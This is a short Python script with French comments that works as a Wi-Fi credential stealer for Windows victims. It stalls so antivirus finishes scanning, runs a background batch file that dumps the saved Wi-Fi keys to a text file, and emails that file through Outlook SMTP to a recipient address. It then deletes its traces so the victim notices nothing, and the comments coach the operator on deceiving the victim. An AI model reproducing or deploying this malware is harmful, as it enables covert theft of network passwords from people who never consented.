
import smtplib
import os
import os.path
import time
import requests

time.sleep(70)  # délai d'attente pour laisser l'antivirus scanner l'exe sans couper son éxecution, pendant ce temps la gagnez du temps en faisant semblant de faire votre CV ou autre
os.system("start /b userhelp.bat ^> zip.txt")  # on balance userhelp en arrière plan et on redirige la sortie sur le ficher contenant les mot de passe dans zip.txt
time.sleep(15)  # temps dépendant du nombre de clé wifi trouvées sur l'ordi de la victime
while True:
    try:
        requests.get('https://www.google.com/').status_code  # test si il y a une connexion internet avant d'envoyer les pass
        break
    except:
        time.sleep(5)  # si pas de connexion internet on retante toute les 5 secondes
        pass

print("Envoi du mail...")  # pensez a cacher la console ou a été lancé l'exe

email = 'votremailbidon@hotmail.com' # E-mail d'envoi
password = 'motdepassedumailbidon' # Mot de passe de l'email d'envoi
send_to_email = 'mailquirecevralespass' # Destinataire
subject = 'Wifi' # Sujet

file_location = "zip.txt"  # Fichier d'enregistrement des clé wifi

with open(file_location) as f:
    message = f.read()

server = smtplib.SMTP('smtp-mail.outlook.com', 587) # SMTP de outlook a configurer
server.starttls()
server.login(email, password)
text = "Subject: {}\n\n{}".format(subject , message)
server.sendmail(email, send_to_email, text)
server.quit()


os.system("del zip.txt")       # effacement de ces 2 fichiers pour ne pas éveiller les doutes si la victime les trouve
os.system("del userhelp.bat")
